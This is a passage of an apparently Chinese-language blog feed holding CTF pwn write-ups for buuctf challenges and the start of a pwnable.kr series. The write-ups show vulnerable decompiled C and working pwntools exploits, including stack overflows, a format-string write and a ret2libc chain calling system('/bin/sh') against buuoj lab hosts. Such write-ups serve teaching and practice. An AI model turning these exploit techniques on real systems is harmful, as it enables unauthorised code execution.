[elf]</span><br></pre></td></tr></table></figure><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>只能说做pwn就是要遇到各种奇奇怪怪的问题</p>]]></content>
    
    
    <summary type="html">靠，好烦</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="环境搭建" scheme="https://ixout.github.io/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>buuctf刷题记录-1</title>
    <link href="https://ixout.github.io/posts/13868/"/>
    <id>https://ixout.github.io/posts/13868/</id>
    <published>2023-03-21T13:53:30.000Z</published>
    <updated>2023-03-27T06:40:57.449Z</updated>
    
    <content type="html"><![CDATA[<h1 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h1><p>题如其名</p><h1 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h1><p>入门题，防护全关</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">15</span>]; <span class="comment">// [rsp+1h] [rbp-Fh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input&quot;</span>);</span><br><span class="line">  gets(s, argv);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ok,bye!!!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote() <span class="comment">#不固定就不写了</span></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">23</span>+p64(<span class="number">0x40118a</span>)) <span class="comment">#其实都比较建议跳过开头的开辟栈帧操作,要不然总是遇到一些奇奇怪怪的问题①</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>吃的大亏就在这道题,我现在才知道<strong>有些题目虽然有输出信息,但远程recv()是收不到东西会卡住的</strong>,而我偏偏又有不管有用没用只要有信息都recv一下的习惯.结果自然是卡死.我还以为是我的虚拟机出了问题,恰巧我拿来验证的另一题也是这样,更加确信了是我虚拟机的问题,在各种尝试无果后,直接重装了一个虚拟机,其中悲惨可见pwn环境安装一篇.</p><details class="folding-tag" yellow><summary> ① </summary>              <div class='content'>              <p>在一些比较新的环境下,如果覆盖返回地址的开头的操作为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push rbp</span><br><span class="line">mov rbp,rsp</span><br></pre></td></tr></table></figure><p>程序就会崩溃</p><p>所以一般建议都直接跳过这两句代码</p><p>(除一些特殊情况外,例如该函数需要rbp进行相对索引)</p>              </div>            </details><h1 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h1><p>和上一题基本没有区别</p><p>只不过最后不是给shell权限而是直接cat flag罢了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">72</span>+p64(<span class="number">0x40060d</span>))</span><br><span class="line">p.interactive() <span class="comment">#虽然不是拿到shell但回到shell模式也能直接获得输出</span></span><br></pre></td></tr></table></figure><h1 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h1><p>保护只开了nx</p><p>ida查看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">44</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">float</span> v2; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0.0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s guess the number.&quot;</span>);</span><br><span class="line">  gets(v1);</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">11.28125</span> )</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Its value should be 11.28125&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两个思路</p><ol><li>直接溢出返回地址到cat /flag指令处</li><li>溢出修改v2,这个比较值是字面值可以在.rodata中找到</li></ol><p><strong>exp1</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28933</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span>+p64(<span class="number">0x4006BE</span>)) <span class="comment">#一开始好几次没成功,以为不行,结果是我打包成p32了</span></span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>exp2</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span></span><br><span class="line">p=remote()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">44</span>+p32(<span class="number">0x41348000</span>))<span class="comment">#这里就要p32了float是四字节,其实p64也行只不过会覆盖到返回地址</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h1><p>保护只开nx</p><p>ida查看</p><p>发现是c++代码,我这半桶水读起来有点吃力</p><p>直接运行看看,发现输入I会被替换为you,这样一个I能填充三个字节就可以做到溢出的效果了</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote()</span><br><span class="line">p.send(<span class="string">b&#x27;I&#x27;</span>*<span class="number">20</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x08048F10</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>读一读源码</p><ol><li><p>fgets(s, 32, edata) ,edata其实也就是stdin了</p></li><li><p>使用 <code>std::string::operator=</code> 将 <code>s</code> 中的内容赋值给名为 <code>input</code> 的 <code>std::string</code> 对象。</p></li><li>使用 <code>std::allocator&lt;char&gt;::allocator</code> 创建了一个 <code>std::allocator&lt;char&gt;</code> 对象，并将其地址传递给 <code>v5</code> 变量。</li><li>使用 <code>std::string::string</code> 构造了一个 <code>std::string</code> 对象 <code>v4</code>，其中包含字符串 “you”。</li><li>使用 <code>std::allocator&lt;char&gt;::allocator</code> 创建了另一个 <code>std::allocator&lt;char&gt;</code> 对象，并将其地址传递给 <code>v7</code> 变量。</li><li>使用 <code>std::string::string</code> 构造了另一个 <code>std::string</code> 对象 <code>v6</code>，其中包含字符串 “I”。</li><li>调用 <code>replace()</code> 函数，将 <code>input</code> 对象中的子字符串 “I” 替换为字符串 “you”.</li><li>使用 <code>std::string::operator=</code> 将 <code>v3</code> 变量中的字符串内容赋值给 <code>input</code> 对象，并在 <code>v6</code> 和 <code>v4</code> 的帮助下构造了一个新的字符串。</li><li>调用 <code>std::string</code> 和 <code>std::allocator</code> 的析构函数来释放已分配的内存。</li><li>将 <code>input</code> 中的字符串复制到 <code>s</code> 变量中。</li><li>使用 <code>printf()</code> 函数打印最终结果</li></ol><h1 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h1><p>没什么好说的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(<span class="number">0x40059A</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h1><p>保护查一查，开启了nx与canary</p><p>ida看一看，确定为格式化字符串漏洞</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-24_210019.png" alt=""></p><p>第一想法是dword_804c044有出现在参数中,那么栈中能找到能找到它,可以泄露其中的数据,再输入以通过</p><p>不过gdb调试发现read后的栈中它的地址已经被覆盖了,</p><p>那就只能选择任意地址写了</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-24_210719.png" alt=""></p><p><strong>格式化字符串是第一个参数</strong>,那么输入内容的相对偏移是10</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote()</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;%12$nxxx&#x27;</span>+p32(<span class="number">0x804C044</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h1><p>检查保护,只开了nx</p><p>ida反汇编,程序为一个菜单式程序</p><p>没有system函数和/bin/sh字符串</p><p>基本确定为libc泄露类题</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-24_212742.png" alt=""></p><p>危险函数如上</p><p>这个循环会修改我们的输入但是有可以跳过的办法,即v0一定是一个大于零的数,则只要payload开头为<strong>\x00</strong>就行了</p><p><strong>exp</strong>如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote()</span><br><span class="line">e=ELF(<span class="string">&#x27;./12&#x27;</span>)</span><br><span class="line">puts_plt=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr=e.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">rdi_addr=<span class="number">0x0000000000400c83</span></span><br><span class="line">ret=<span class="number">0x00000000004006b9</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">padding=<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x57</span> <span class="comment">#这里脑抽，0x50换算成了十进制，填的时候又加了0x，被报错折磨了半个小时才发现，我好菜</span></span><br><span class="line">p.sendline(padding+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Ciphertext\n&#x27;</span>)   <span class="comment">#puts自带换行</span></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#64位函数真实地址一般只占6个字节，且最高位为&#x27;\x7f&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))  <span class="comment">#可以选择用Lincsearcher来直接pwntools中操作，但我还是选择用libcdatabase这个网站查询获得地址</span></span><br><span class="line">libc_base=puts_addr-<span class="number">0x0809c0</span></span><br><span class="line">system=libc_base+<span class="number">0x04f440</span></span><br><span class="line">binsh=libc_base+<span class="number">0x1b3e9a</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(padding+p64(rdi_addr)+p64(binsh)+p64(ret)+p64(system)) <span class="comment">#这里有个栈对齐，下面说一说</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><details class="folding-tag" cyan><summary> 补充一个可能所有人都知道但我做这道题才认真思考了的问题 </summary>              <div class='content'>              <p>即ELF.symbol,ELF.plt,ELF.got的使用区分</p><p>ELF.plt得到的plt的地址,ELF.plt的内容首项是ELF.got的地址,ELF.got的内容是函数的真实加载地址</p><p>ELF.plt内容指向ELF.got的地址,当需要访问函数的真实加载地址就需要访问ELF.got内容,但动态链接下,初始ELF.got项必然不是函数真实地址,且访问ELF.got又需要访问ELF.plt</p><p>另外ELF.plt一定能进入函数,ELF.got则不一定</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-25_211747.png" alt=""></p><p>使用哪个,则要看需要访问的内容,要实现什么目的</p><p>再来看symbols和plt的使用场合</p><p>这两个很多时候返回是相同的(差不多可以当作一个用了,像这题,puts_plt=e.symbols[‘puts’也是可以的])</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ELF.symbols适用场景：</span><br><span class="line">查找特定符号的地址，例如函数的入口地址、全局变量的地址等。</span><br><span class="line">枚举可执行文件中的所有符号，例如枚举所有导出函数。优先考虑PLT条目，而不是GOT条目。</span><br><span class="line">ELF.plt适用场景：</span><br><span class="line">查找需要动态链接的函数的入口地址，例如为调用某个函数进行ROP攻击时。</span><br><span class="line">枚举需要动态链接的函数，例如枚举可执行文件依赖的所有共享库中的导出函数。</span><br></pre></td></tr></table></figure>              </div>            </details><details class="folding-tag" yellow><summary> 因为不严谨导致问题的细节 </summary>              <div class='content'>              <p>其实就是一些小细节</p><ol><li>send和sendline的使用,大多数时候二者没有差别,但是诸如遇到了getchar(),gets()这些函数,就只能用sendline(或者send自己加\n)了,因为这两个函数不接收到\n就不会继续执行,导致程序的执行卡住,不能往下执行</li><li>puts函数输出时会自带\n,接收时要注意</li></ol>              </div>            </details><details class="folding-tag" green><summary> 栈对齐 </summary>              <div class='content'>              <p>说起来其实也没什么东西,就是在x86_64的一些环境下,<strong>system函数</strong>地址在栈中的存放地址,要刚好是16的整数倍,例如如果最后两位是a8,则会报错timeout: the monitored command dumped core,就要通过栈对齐使之变为b0,一般都是通过前面放一个无功能gadget(即ret)来填充使栈对齐</p>              </div>            </details><p><strong>这题其实是第一题我自己做出来的libc泄露类题目,虽然之前接触过不少,但都没有实操,亲自做了一遍,收获很大</strong></p><h1 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h1><p>ida一看,就是对一个数组进行输入,第14个元素如果等于17则拿到shell</p><p>唯一值得注意的就是</p><p><code>if ( *(_QWORD *)&amp;var[13] )</code>将dword指针变为了qword指针,所以第15个元素得留空,不过以防之前栈中存留了一些数据,也可以用p64打包直接覆盖</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26449</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p32(<span class="number">0x0</span>)*<span class="number">13</span>+p64(<span class="number">0x11</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>好几次遇到了同一个问题,进入shell模式后,第一条指令永远没有输出,虽然无伤大雅,且并不是每题都这样,但强迫症很难受啊</p><h1 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h1><p>保护只开了nx</p><p>ida查看有system函数,而且能找到到binsh字符串</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote()</span><br><span class="line">p.recv()</span><br><span class="line">system=<span class="number">0x0804845C</span></span><br><span class="line">binsh=<span class="number">0x0804A024</span></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">140</span>+p32(system)+p32(binsh))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h1><p>常规入门题</p><p>只不过read字符数由自己输入</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28836</span>)</span><br><span class="line">p.recv()</span><br><span class="line">backdoor=<span class="number">0x4006EA</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;40&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(backdoor))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h1><p>标准流程就不重复了,这题单看题不难,但坑是一个接着一个</p><p>第一个坑,ida显示的v4距返回地址计算出来应该是60,但是实际去gdb调试会发现应该是56,之前做了那么多题都是直接用ida给的数据,这次突然跳出来一个不准的确实很搞人（主要这题栈帧不是常见的类型）,也算得到了一个教训,最好还是gdb实操计算偏移,当然直接去读汇编代码也能得出正确结果</p><p>第二个大坑,就是这题没有设置setbuf(stdout，0)，所以本题的输出是缓存在服务器本地的，换句话说：如果程序不正常退出，本地是不会有输出的,所以必须要正常退出,其实这也应该是第一题我没能接收信息卡住的原因</p><p>更多可见基础杂烩篇</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27423</span>)</span><br><span class="line">backdoor=<span class="number">0x080489A0</span></span><br><span class="line">exit= <span class="number">0x0804E6A0</span>  <span class="comment">#很重要</span></span><br><span class="line">a1=<span class="number">0x308CD64F</span></span><br><span class="line">a2=<span class="number">0x195719D1</span></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span>+p32(backdoor)+p32(exit)+p32(a1)+p32(a2))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">小心再小心</summary>
    
    
    
    <category term="题解" scheme="https://ixout.github.io/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
    <category term="wp" scheme="https://ixout.github.io/tags/wp/"/>
    
    <category term="buuctf" scheme="https://ixout.github.io/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr刷题记录-1</title>
    <link href="https://ixout.github.io/posts/4569/"/>
    <id>https://ixout.github.io/posts/4569/</id>
    <published>2023-03-20T13:46:51.000Z</published>
    <updated>2023-03-27T06:13:44.313Z</updated>
    
    <content type="html"><![CDATA[<h1 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h1><p>ssh连上之后，ls发现三个有效文件fd,fd.c,flag</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-20_220727.png" alt=""></p><p>flag没有任何权限向我们开放</p><p>再看fd.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">fd@pwnable:~$ cat fd.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[], <span class="type">char</span>* envp[])</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pass argv[1] a number\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line"><span class="type">int</span> len = <span class="number">0</span>;</span><br><span class="line">len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">&quot;LETMEWIN\n&quot;</span>, buf))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;good job :)\n&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;learn about Linux file IO\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码问题不大,考验的就是对linux系统read函数最基本的了解了,0是标准输入,使fd为0即可,0x1234转换为十进制即是4660</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fd 4660</span><br></pre></td></tr></table></figure><ul><li>atoi()：atoi()函数会扫描参数 str 字符串，跳过前面的空白字符（例如空格，tab 缩进等，可以通过 isspace() 函数来检测），直到遇上数字或正负符号才开始做转换，而再遇到非数字或字符串结束时(‘\0’)才结束转换，并将结果返回，返回转换后的整型数；如果 str 不能转换成 int 或者 str 为空字符串，那么将返回 0。</li></ul><hr><h1 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h1><p>连上后三个文件,文件样式和权限和上一题一样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">check_password</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* p)</span>&#123;</span><br><span class="line"><span class="type">int</span>* ip = (<span class="type">int</span>*)p;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">res += ip[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;usage : %s [passcode]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;passcode length should be 20 bytes\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;wrong passcode.\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>c语言基础不牢,char* 